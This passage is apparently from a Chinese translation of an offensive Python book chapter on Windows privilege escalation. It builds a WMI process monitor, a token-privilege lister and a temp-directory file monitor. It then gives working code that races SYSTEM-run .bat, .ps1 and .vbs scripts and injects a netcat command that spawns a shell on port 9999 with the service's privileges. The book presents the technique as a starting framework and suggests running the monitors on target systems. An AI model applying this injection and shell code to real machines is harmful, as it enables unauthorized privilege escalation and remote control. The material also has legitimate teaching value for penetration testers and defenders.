class="subst">&#123;proc_owner&#125;</span> , <span class="subst">&#123;privileges&#125;</span>'</span></span><br><span class="line">                )</span><br><span class="line">            print(process_log_message)</span><br><span class="line">            print()</span><br><span class="line">            log_to_file(process_log_message)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    monitor()</span><br></pre></td></tr></table></figure>

<p>我们从实例化 WMI 类开始[1]，并告诉它监测进程创建事件[2]。然后我们进入一个循环，这个循环一直阻塞直到 <em>process_watcher</em> 返回一个新的进程事件[3]。新的进程事件是 WMI 的 <em>Win32_Process</em> 类，它包含了我们正在寻找的所有相关信息(有关 <em>Win32_Process</em> WMI 类的更多信息，请参见 MSDN 在线文档)。类函数之一是 <em>GetOwner</em> ，我们调用它来确定谁产生了这个进程[4]。我们收集我们正在寻找的所有进程信息，将其输出到屏幕上，并记录到一个文件中。</p>
<h3 id="Kicking-the-Tires"><a href="#Kicking-the-Tires" class="headerlink" title="Kicking the Tires"></a>Kicking the Tires</h3><p>让我们启动进程监控脚本，创建一些进程，看看输出是什么样的:</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">tim</span>\<span class="title">work</span>&gt;<span class="title">python</span> <span class="title">process_monitor.py</span></span></span><br><span class="line"><span class="function">"<span class="title">Calculator.exe</span>",</span></span><br><span class="line"><span class="function">20200624083538.964492-240 ,</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">WindowsApps</span>\<span class="title">Microsoft.WindowsCalculator</span>\<span class="title">Calculator.exe</span>,</span></span><br><span class="line"><span class="function">1204 ,</span></span><br><span class="line"><span class="function">10312 ,</span></span><br><span class="line"><span class="function">('<span class="title">DESKTOP</span>-<span class="title">CC91N7I</span>', 0, '<span class="title">tim</span>') ,</span></span><br><span class="line"><span class="function"><span class="title">N</span>/<span class="title">A</span></span></span><br><span class="line"><span class="function"><span class="title">notepad</span> ,</span></span><br><span class="line"><span class="function">20200624083340.325593-240 ,</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>\<span class="title">notepad.exe</span>,</span></span><br><span class="line"><span class="function">13184 ,</span></span><br><span class="line"><span class="function">12788 ,</span></span><br><span class="line"><span class="function">('<span class="title">DESKTOP</span>-<span class="title">CC91N7I</span>', 0, '<span class="title">tim</span>') ,</span></span><br><span class="line"><span class="function"><span class="title">N</span>/<span class="title">A</span></span></span><br></pre></td></tr></table></figure>

<p>开始运行该脚本后，我们运行 <em>notepad.exe</em> 和 <em>calc.exe</em> 。如您所见，该工具可以正确输出这些进程信息。您现在可以休息一段时间，让这个脚本运行一天，并捕获所有正在运行的进程、计划任务和各种软件更新程序的记录。如果幸运的话，你可能会发现恶意软件（也可能是不幸）。它对于登录和退出系统时也很有用，因为这些操作生成的事件可能会显示出特权进程。</p>
<p>现在我们已经有了基本的进程监控能力，让我们可以在日志中填写权限字段。不过，首先，您应该稍微了解一下 Windows 特权是如何工作的，以及它们为什么很重要。</p>
<h2 id="Windows令牌权限"><a href="#Windows令牌权限" class="headerlink" title="Windows令牌权限"></a>Windows令牌权限</h2><p>按照微软的说法，Windows <em>token</em> 是“描述进程或线程的安全上下文的对象”(请参见 <a href="http://msdn.microsoft.com/" target="_blank" rel="noopener">http://msdn.microsoft.com/</a> “Access Tokens” )。换句话说，令牌的权限和特权决定了进程或线程可以执行哪些任务。</p>
<p>不能理解这些令牌会让你感到麻烦。作为安全产品的一部分，一个善意的开发人员可能会创建一个系统托盘应用程序，他们希望在该应用程序上给一个非特权用户控制主要 Windows 服务的能力，也就是驱动程序。开发人员在进程上使用本机 Windows API 函数 <em>AdjustTokenPrivileges</em> ，然后，开发者十分“单纯”地授予系统托盘应用程序 <em>SeLoadDriver</em> 权限。开发人员没有注意到的是，如果您可以爬进系统托盘应用程序，您现在可以加载或卸载任何您想要的驱动程序，这意味着您可以使用内核模式下的 rootkit ，这就意味着游戏结束了。</p>
<p>（笔者注： rootkit : Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。Rootkit 的目的在于隐藏自己以及其他软件不被发现。它可以通过阻止用户识别和删除攻击者的软件来达到这个目的。Rootkit 几乎可以隐藏任何软件，包括文件服务器、键盘记录器、Botnet 和 Remailer。许多 Rootkit 甚至可以隐藏大型的文件集合并允许攻击者在您的计算机上保存许多文件，而您无法看到这些文件。 Rootkit 本身不会像病毒或蠕虫那样影响计算机的运行。）</p>
<p>请记住，如果您不能以系统或管理员的身份运行您的进程监视器，那么您需要关注您能够监视哪些进程。是否还有你能利用的其他特权？以拥有错误权限的用户身份运行的进程是进入系统或在内核中运行代码的绝佳方式。表10-1列出了作者一直在寻找的有趣的特权。这并不是详尽无遗的，但它是一个很好的起点。你可以在 MSDN 网站上找到一个完整的权限列表。</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20210721205416498.png" alt="image-20210721205416498"></p>
<p>既然您知道了要查找哪些特权，那么让我们利用 Python 自动检索所监视进程上的已启用特权。我们将使用到 <em>win32security</em> 、<em>win32api</em> 和 <em>win32con</em> 模块。如果遇到无法加载这些模块的情况，请尝试使用 <em>ctypes</em> 库将以下所有函数转换为本地调用。这是可能的，尽管这需要更多的工作量。</p>
<p>直接将以下代码添加到 <em>process_monitor.py</em> 位于现有的 <em>log_to_file</em> 函数的上方：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_process_privileges</span><span class="params">(pid)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        hproc = win32api.OpenProcess( [<span class="number">1</span>]</span><br><span class="line">              win32con.PROCESS_QUERY_INFORMATION, <span class="literal">False</span>, pid</span><br><span class="line">              )</span><br><span class="line">        htok = win32security.OpenProcessToken(hproc, win32con.TOKEN_QUERY) [<span class="number">2</span>]</span><br><span class="line">        privs = win32security.GetTokenInformation( [<span class="number">3</span>]</span><br><span class="line">            htok,win32security.TokenPrivileges</span><br><span class="line">            )</span><br><span class="line">        privileges = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> priv_id, flags <span class="keyword">in</span> privs:</span><br><span class="line">            <span class="keyword">if</span> flags == (win32security.SE_PRIVILEGE_ENABLED | [<span class="number">4</span>]</span><br><span class="line">                    win32security.SE_PRIVILEGE_ENABLED_BY_DEFAULT):</span><br><span class="line">                privileges += <span class="string">f'<span class="subst">&#123;win32security.LookupPrivilegeName(<span class="literal">None</span>, priv_id)&#125;</span>|'</span> [<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        privileges = <span class="string">'N/A'</span></span><br><span class="line">    <span class="keyword">return</span> privileges</span><br></pre></td></tr></table></figure>

<p>我们使用进程 ID 来获取目标进程的句柄[1]。接下来，我们打开进程令牌[2]，并通过发送 <em>win32security.TokenPrivileges</em> 结构来请求该进程的令牌信息[3]。函数调用返回一个元组列表，其中元组的第一个成员是特权，第二个成员描述是否启用了特权。因为我们只关心已启用的，所以首先检查已启用的位[4]，然后查找权限的可读名称[5]。</p>
<p>接下来，修改现有代码以正确输出和记录此信息。更改下面这行的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privileges = <span class="string">"N/A"</span></span><br></pre></td></tr></table></figure>

<p>改成下面这行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privileges = get_process_privileges(pid)</span><br></pre></td></tr></table></figure>

<p>现在我们已经添加了特权跟踪代码，让我们重新运行 <em>process_monitor.py</em> 脚本并检查输出。您应该看到特权信息：</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">tim</span>\<span class="title">work</span>&gt; <span class="title">python.exe</span> <span class="title">process_monitor.py</span></span></span><br><span class="line"><span class="function">"<span class="title">Calculator.exe</span>",</span></span><br><span class="line"><span class="function">20200624084445.120519-240 ,</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">WindowsApps</span>\<span class="title">Microsoft.WindowsCalculator</span>\<span class="title">Calculator.exe</span>,</span></span><br><span class="line"><span class="function">1204 ,</span></span><br><span class="line"><span class="function">13116 ,</span></span><br><span class="line"><span class="function">('<span class="title">DESKTOP</span>-<span class="title">CC91N7I</span>', 0, '<span class="title">tim</span>') ,</span></span><br><span class="line"><span class="function"><span class="title">SeChangeNotifyPrivilege</span>|</span></span><br><span class="line"><span class="function"><span class="title">notepad</span> ,</span></span><br><span class="line"><span class="function">20200624084436.727998-240 ,</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>\<span class="title">notepad.exe</span>,</span></span><br><span class="line"><span class="function">10720 ,</span></span><br><span class="line"><span class="function">2732 ,</span></span><br><span class="line"><span class="function">('<span class="title">DESKTOP</span>-<span class="title">CC91N7I</span>', 0, '<span class="title">tim</span>') ,</span></span><br><span class="line"><span class="function"><span class="title">SeChangeNotifyPrivilege</span>|<span class="title">SeImpersonatePrivilege</span>|<span class="title">SeCreateGlobalPrivilege</span>|</span></span><br></pre></td></tr></table></figure>

<p>您可以看到，我们已经成功地记录了这些进程的启用权限。现在，我们可以很容易地在脚本中加入一些智能功能，只记录以无特权用户身份运行但启用了令人关注的权限的进程。进程监视的功能可以帮助我们发现不安全地依赖于外部文件的进程。</p>
<h2 id="Winning-the-Race–赢得比赛"><a href="#Winning-the-Race–赢得比赛" class="headerlink" title="Winning the Race–赢得比赛"></a>Winning the Race–赢得比赛</h2><p>批处理、 VBScript 和 PowerShell 脚本通过自动化单调的任务使系统管理员的生活更轻松。例如，他们可能会不断地向中央存储服务注册，或者强制从他们自己的存储库中更新软件。一个常见的问题是对这些脚本文件缺乏适当的访问控制。在许多情况下，在其他安全服务器上，我们发现系统用户每天运行一次批处理或 PowerShell 脚本，而任何用户都可以对这些脚本进行全局写入。</p>
<p>如果您在企业网络中运行进程监控的时间足够长（或者只需安装本章开头提供的示例服务），则可能会看到类似如下的进程记录：</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wscript.exe C:\Windows\TEMP\bhservice_task.vbs , <span class="number">20200624102235</span>.<span class="number">287541</span>-<span class="number">240</span> , C:\Windows\</span><br><span class="line">SysWOW64\wscript.exe,<span class="number">2828</span> , <span class="number">17516</span> , ('NT AUTHORITY', <span class="number">0</span>, 'SYSTEM') , SeLockMemoryPrivilege|SeTcb</span><br><span class="line">Privilege|SeSystemProfilePrivilege|SeProfileSingleProcessPrivilege|SeIncreaseBasePriorityPrivil</span><br><span class="line">ege|SeCreatePagefilePrivilege|SeCreatePermanentPrivilege|SeDebugPrivilege|SeAuditPrivilege|SeCh</span><br><span class="line">angeNotifyPrivilege|SeImpersonatePrivilege|SeCreateGlobalPrivilege|SeIncreaseWorkingSetPrivileg</span><br><span class="line">e|SeTimeZonePrivilege|SeCreateSymbolicLinkPrivilege|SeDelegateSessionUserImpersonatePrivilege|</span><br></pre></td></tr></table></figure>

<p>您可以看到一个 SYSTEM 进程已经生成了 <em>wscript.exe</em> 二进制文件，并传入了 <em>C:\WINDOWS\TEMP\bhservice_task.vbs</em> 参数。您在本章开头创建的示例 <em>bhservice</em> 应该会每分钟生成一次这些事件。</p>
<p>但是如果你列出目录的内容，你就看不到这个文件。这是因为服务会创建一个包含 VBScript 的文件，然后执行并删除该 VBScript 。我们已经在许多案例中看到了商业软件执行的这种操作；通常，软件在临时位置创建文件，将命令写入文件，执行生成的程序文件，然后删除这些文件。</p>
<p>为了利用这个条件，我们必须有效地赢得与运行代码的竞争。当软件或计划任务创建文件时，我们需要能够在进程运行和删除之前将自己的代码注入到文件中。实现这一点的诀窍是使用方便的 Windows API <em>ReadDirectoryChangesW</em> ，它使我们能够监视一个目录中对文件或子目录的任何更改。我们还可以过滤这些事件，以便确定文件的保存时间。这样，我们就可以在运行之前快速地将代码注入其中。您可能会发现，在24小时或更长时间内监视所有临时目录是非常有用的；有时，您会在潜在的权限提升上发现有趣的 bug 或信息泄露。</p>
<p>让我们先创建一个文件监视器。然后我们将在此基础上添加自动注入代码。保存一个名为 <em>file_monitor.py</em> 的新文件并输入以下内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Modified example that is originally given here:</span></span><br><span class="line"><span class="comment"># http://timgolden.me.uk/python/win32_how_do_i/watch_directory_for_changes.html</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> win32con</span><br><span class="line"><span class="keyword">import</span> win32file</span><br><span class="line"></span><br><span class="line">FILE_CREATED = <span class="number">1</span></span><br><span class="line">FILE_DELETED = <span class="number">2</span></span><br><span class="line">FILE_MODIFIED = <span class="number">3</span></span><br><span class="line">FILE_RENAMED_FROM = <span class="number">4</span></span><br><span class="line">FILE_RENAMED_TO = <span class="number">5</span></span><br><span class="line">FILE_LIST_DIRECTORY = <span class="number">0x0001</span></span><br><span class="line">[<span class="number">1</span>] PATHS = [<span class="string">'c:\\WINDOWS\\Temp'</span>, tempfile.gettempdir()]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">monitor</span><span class="params">(path_to_watch)</span>:</span></span><br><span class="line">[<span class="number">2</span>] h_directory = win32file.CreateFile(</span><br><span class="line">        path_to_watch,</span><br><span class="line">        FILE_LIST_DIRECTORY,</span><br><span class="line">        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE |</span><br><span class="line">        win32con.FILE_SHARE_DELETE,</span><br><span class="line">        <span class="literal">None</span>,</span><br><span class="line">        win32con.OPEN_EXISTING,</span><br><span class="line">        win32con.FILE_FLAG_BACKUP_SEMANTICS,</span><br><span class="line">        <span class="literal">None</span></span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">        [<span class="number">3</span>] results = win32file.ReadDirectoryChangesW(</span><br><span class="line">                h_directory,</span><br><span class="line">                <span class="number">1024</span>,</span><br><span class="line">                <span class="literal">True</span>,</span><br><span class="line">                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |</span><br><span class="line">                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |</span><br><span class="line">                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |</span><br><span class="line">                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |</span><br><span class="line">                win32con.FILE_NOTIFY_CHANGE_SECURITY |</span><br><span class="line">                win32con.FILE_NOTIFY_CHANGE_SIZE,</span><br><span class="line">                <span class="literal">None</span>,</span><br><span class="line">                <span class="literal">None</span></span><br><span class="line">            )</span><br><span class="line">        [<span class="number">4</span>] <span class="keyword">for</span> action, file_name <span class="keyword">in</span> results:</span><br><span class="line">                full_filename = os.path.join(path_to_watch, file_name)</span><br><span class="line">                <span class="keyword">if</span> action == FILE_CREATED:</span><br><span class="line">                    print(<span class="string">f'[+] Created <span class="subst">&#123;full_filename&#125;</span>'</span>)</span><br><span class="line">                <span class="keyword">elif</span> action == FILE_DELETED:</span><br><span class="line">                    print(<span class="string">f'[-] Deleted <span class="subst">&#123;full_filename&#125;</span>'</span>)</span><br><span class="line">                <span class="keyword">elif</span> action == FILE_MODIFIED:</span><br><span class="line">                    print(<span class="string">f'[*] Modified <span class="subst">&#123;full_filename&#125;</span>'</span>)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        print(<span class="string">'[vvv] Dumping contents ... '</span>)</span><br><span class="line">                    [<span class="number">5</span>] <span class="keyword">with</span> open(full_filename) <span class="keyword">as</span> f:</span><br><span class="line">                            contents = f.read()</span><br><span class="line">                        print(contents)</span><br><span class="line">                        print(<span class="string">'[^^^] Dump complete.'</span>)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        print(<span class="string">f'[!!!] Dump failed. <span class="subst">&#123;e&#125;</span>'</span>)</span><br><span class="line">                <span class="keyword">elif</span> action == FILE_RENAMED_FROM:</span><br><span class="line">                    print(<span class="string">f'[&gt;] Renamed from <span class="subst">&#123;full_filename&#125;</span>'</span>)</span><br><span class="line">                <span class="keyword">elif</span> action == FILE_RENAMED_TO:</span><br><span class="line">                    print(<span class="string">f'[&lt;] Renamed to <span class="subst">&#123;full_filename&#125;</span>'</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">f'[?] Unknown action on <span class="subst">&#123;full_filename&#125;</span>'</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> PATHS:</span><br><span class="line">        monitor_thread = threading.Thread(target=monitor, args=(path,))</span><br><span class="line">        monitor_thread.start()</span><br></pre></td></tr></table></figure>

<p>我们定义了一个要监视的目录列表[1]，在我们的示例中是两个常见的临时文件目录。你可能想留意其他地方，所以在你认为合适的时候编辑这个列表。</p>
<p>对于每个路径，我们将创建一个调用 <em>start_monitor</em> 函数的监视线程。此函数的第一个任务是获取要监视的目录的句柄[2]，然后调用 <em>ReadDirectoryChangesW</em> 函数[3]，它在目录内发生变化时通知我们。我们接收更改的目标文件的文件名和发生的事件类型[4]。从这里，我们打印出有关该特定文件发生了什么的有用信息，如果我们检测到该文件已被修改，我们将转储该文件的内容以供参考[5]。</p>
<h3 id="Kicking-the-Tires-1"><a href="#Kicking-the-Tires-1" class="headerlink" title="Kicking the Tires"></a>Kicking the Tires</h3><p>打开 <em>cmd.exe</em> shell 并运行 <em>file_monitor.py</em> ：</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">tim</span>\<span class="title">work</span>&gt; <span class="title">python.exe</span> <span class="title">file_monitor.py</span></span></span><br></pre></td></tr></table></figure>

<p>打开第二个 <em>cmd.exe</em> shell 并运行以下命令：</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">tim</span>\<span class="title">work</span>&gt; <span class="title">cd</span> <span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">temp</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">Temp</span>&gt; <span class="title">echo</span> <span class="title">hello</span> &gt; <span class="title">filetest.bat</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">Temp</span>&gt; <span class="title">rename</span> <span class="title">filetest.bat</span> <span class="title">file2test</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">Temp</span>&gt; <span class="title">del</span> <span class="title">file2test</span></span></span><br></pre></td></tr></table></figure>

<p>您应该看到类似如下输出：</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+] Created c:\WINDOWS\Temp\filetest.bat</span><br><span class="line">[*] Modified c:\WINDOWS\Temp\filetest.bat</span><br><span class="line">[vvv] Dumping contents ...</span><br><span class="line">hello</span><br><span class="line">[^^^] Dump complete.</span><br><span class="line">[&gt;] Renamed from c:\WINDOWS\Temp\filetest.bat</span><br><span class="line">[&lt;] Renamed to c:\WINDOWS\Temp\file2test</span><br><span class="line">[-] Deleted c:\WINDOWS\Temp\file2test</span><br></pre></td></tr></table></figure>

<p>如果一切都按计划进行，我们建议您在目标系统上保持文件监视器24小时运行。您可能会惊讶地看到文件被创建、执行和删除。您还可以使用进程监视脚本来查找要监视的其他有趣的文件路径。软件更新可能会引起特别的兴趣。</p>
<p>让我们添加向这些文件注入代码的能力。</p>
<h2 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h2><p>现在我们可以监视进程和文件位置，我们将自动将代码注入目标文件。我们将创建非常简单的代码片段，生成具有原始服务特权级别的 <em>netcat.py</em> 工具的编译版本。您可以使用这些 VBScript 、批处理和 PowerShell 文件做大量麻烦的事情。我们将创建一个通用框架，您可以从这里开始。修改 <em>file_monitor.py</em> 脚本并在文件修改常量后添加以下代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NETCAT = <span class="string">'c:\\users\\tim\\work\\netcat.exe'</span></span><br><span class="line">TGT_IP = <span class="string">'192.168.1.208'</span></span><br><span class="line">CMD = <span class="string">f'<span class="subst">&#123;NETCAT&#125;</span> -t <span class="subst">&#123;TGT_IP&#125;</span> -p 9999 -l -c '</span></span><br></pre></td></tr></table></figure>

<p>我们要注入的代码将使用以下常量： <em>TGT_IP</em> 是受害者机器的 IP 地址（我们要注入代码的 Windows 机器）， <em>TGT_PORT</em> 是我们要连接的端口。 <em>NETCAT</em> 变量给出了我们在第2章中编写的 Netcat 替代品的位置。如果您还没有根据该代码创建可执行文件，现在可以这样做：</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">tim</span>\<span class="title">netcat</span>&gt; <span class="title">pyinstaller</span> -<span class="title">F</span> <span class="title">netcat.py</span></span></span><br></pre></td></tr></table></figure>

<p>然后将生成的 <em>netcat.exe</em> 文件放在该目录下，并确保 <em>NETCAT</em> 变量指向该可执行文件。</p>
<p>我们注入的代码将执行的命令创建一个反弹命令的 shell ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] FILE_TYPES = &#123;</span><br><span class="line">    <span class="string">'.bat'</span>: [<span class="string">"\r\nREM bhpmarker\r\n"</span>, <span class="string">f'\r\n<span class="subst">&#123;CMD&#125;</span>\r\n'</span>],</span><br><span class="line">    <span class="string">'.ps1'</span>: [<span class="string">"\r\n#bhpmarker\r\n"</span>, <span class="string">f'\r\nStart-Process "<span class="subst">&#123;CMD&#125;</span>"\r\n'</span>],</span><br><span class="line">    <span class="string">'.vbs'</span>: [<span class="string">"\r\n'bhpmarker\r\n"</span>,</span><br><span class="line">    <span class="string">f'\r\nCreateObject("Wscript.Shell").Run("<span class="subst">&#123;CMD&#125;</span>")\r\n'</span>],</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject_code</span><span class="params">(full_filename, contents, extension)</span>:</span></span><br><span class="line">[<span class="number">2</span>] <span class="keyword">if</span> FILE_TYPES[extension][<span class="number">0</span>].strip() <span class="keyword">in</span> contents:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">[<span class="number">3</span>] full_contents = FILE_TYPES[extension][<span class="number">0</span>]</span><br><span class="line">    full_contents += FILE_TYPES[extension][<span class="number">1</span>]</span><br><span class="line">    full_contents += contents</span><br><span class="line">    <span class="keyword">with</span> open(full_filename, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(full_contents)</span><br><span class="line">    print(<span class="string">'\\o/ Injected Code'</span>)</span><br></pre></td></tr></table></figure>

<p>我们首先定义一个与特定文件扩展名匹配的代码片段字典[1]。这些代码片段包括一个唯一的标记和要注入的代码。我们使用标记的原因是为了避免无限循环，在无限循环中，我们可以看到文件修改，插入代码，并使程序将此操作检测为文件修改事件。如果不考虑这个问题，这个循环会一直持续到文件变得巨大，硬盘开始崩溃。相反，程序将检查标记，如果找到它，就知道不要再次修改文件。</p>
<p>接下来， <em>injectu_code</em> 函数处理实际的代码注入和文件标记检查。在验证标记不存在之后[2]，我们写入标记和希望目标进程运行的代码[3]。现在我们需要修改主事件循环，以包含文件扩展名检查和调用 <em>inject_code</em> ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">--snip--</span><br><span class="line">                <span class="keyword">elif</span> action == FILE_MODIFIED:</span><br><span class="line">                [<span class="number">1</span>] extension = os.path.splitext(full_filename)[<span class="number">1</span>]</span><br><span class="line">            [<span class="number">2</span>] <span class="keyword">if</span> extension <span class="keyword">in</span> FILE_TYPES:</span><br><span class="line">                    print(<span class="string">f'[*] Modified <span class="subst">&#123;full_filename&#125;</span>'</span>)</span><br><span class="line">                    print(<span class="string">'[vvv] Dumping contents ... '</span>)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">with</span> open(full_filename) <span class="keyword">as</span> f:</span><br><span class="line">                            contents = f.read()</span><br><span class="line">                        <span class="comment"># NEW CODE</span></span><br><span class="line">                        inject_code(full_filename, contents, extension)</span><br><span class="line">                        print(contents)</span><br><span class="line">                        print(<span class="string">'[^^^] Dump complete.'</span>)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        print(<span class="string">f'[!!!] Dump failed. <span class="subst">&#123;e&#125;</span>'</span>)</span><br><span class="line">--snip--</span><br></pre></td></tr></table></figure>

<p>这是对主循环的一个非常简单的扩充。我们对文件扩展名进行快速拆分[1]，然后对照已知文件类型的字典进行检查[2]。如果在字典中检测到文件扩展名，则调用 <em>inject_code</em> 函数。我们试一下吧。</p>
